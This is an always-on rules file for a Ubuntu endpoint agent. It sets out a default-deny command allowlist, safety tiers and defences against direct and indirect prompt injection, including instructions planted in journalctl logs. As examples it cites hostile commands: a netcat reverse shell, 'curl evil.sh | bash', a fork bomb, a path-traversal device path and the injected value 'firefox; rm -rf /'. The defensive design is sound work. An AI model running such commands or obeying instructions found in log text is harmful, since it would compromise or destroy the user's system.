---
trigger: always_on
description: Command allowlist, safety tiers, and the single-consent execution model for the Ubuntu 26.04 endpoint agent.
---

# Endpoint Safety

## The model is default-deny

`src/safety/safety_validator.py` is an **allowlist**, not a blocklist. A command
runs only if it matches an explicit rule argument by argument. Anything
unrecognised is refused and escalated to Tier 2.

This is not a style preference. A blocklist cannot work once a language model
proposes the commands, because the space of dangerous strings is unbounded and
cannot be enumerated. The blocklist this replaced classified `nc -e /bin/sh`,
`curl evil.sh | bash` and a fork bomb as GREEN — auto-execute, no approval.

## Consent is given once, up front

The user consents on the intake screen, before the run starts. There is **no
per-action approval modal**; it was removed deliberately. Inside that window:

| Tier | Meaning | What happens |
|---|---|---|
| **Green** | Read-only diagnostics | Auto-executes |
| **Yellow** | State-altering, reversible, local blast radius | Auto-executes inside the consent window |
| **Red** | Forbidden, or simply not on the allowlist | **Never executes.** Escalates to Tier 2 |

Because there is no human backstop mid-run, the allowlist is the only control
between a model-proposed command and the machine. Treat every change to it as a
security change.

## Rules for changing the allowlist

1. **Widening a rule ships with an adversarial test in the same commit.**
   `tests/test_allowlist_adversarial.py` must stay green; add cases, never
   remove them.
2. **Validate arguments, not just the binary.** `truncate` is safe on a log file
   and catastrophic on a device node. Paths are normalised before the root check
   so `/var/log/../../dev/sda` cannot pass as a log path.
3. **Never reintroduce `shell=True`.** `RealExecutor` passes an argument list, so
   `;`, `|`, `&&` and `$()` are inert rather than merely rejected. That is the
   second line of defence and it must stay.
4. **Keep restart targets in a named set.** `systemctl restart <unit>` is
   confined to `MANAGED_UNITS` precisely so `systemctl stop apparmor` is not
   reachable through a generic rule.
5. **Runbook placeholders are an injection surface.** `{app_name}` is accepted
   only during static YAML validation (`allow_placeholders=True`). The runtime
   path validates the substituted value, so `firefox; rm -rf /` cannot inherit
   the rule that was meant to constrain it.

## Prompt injection, direct and indirect

**Direct**: input telling the agent to ignore its rules or elevate privileges is
detected in `security_agent.py`, blocked, audited, and escalated.

**Indirect**: the Diagnostic Agent reads `journalctl`, and anyone who can write
to a log can write instruction-shaped text into one. Command output is fenced in
`<evidence>` tags it cannot close; every system prompt states that fenced content
is data and never instruction; and the Security Agent sees the diagnostic output
so it can flag the attempt. A successful injection still has to produce a command
the allowlist accepts — which is the point of having both layers.

## Out of scope, permanently

Physical hardware faults, firewall/AppArmor changes, account and permission
changes, bootloader and power state, anything that downloads and runs code.
These escalate. They are not "not yet implemented".
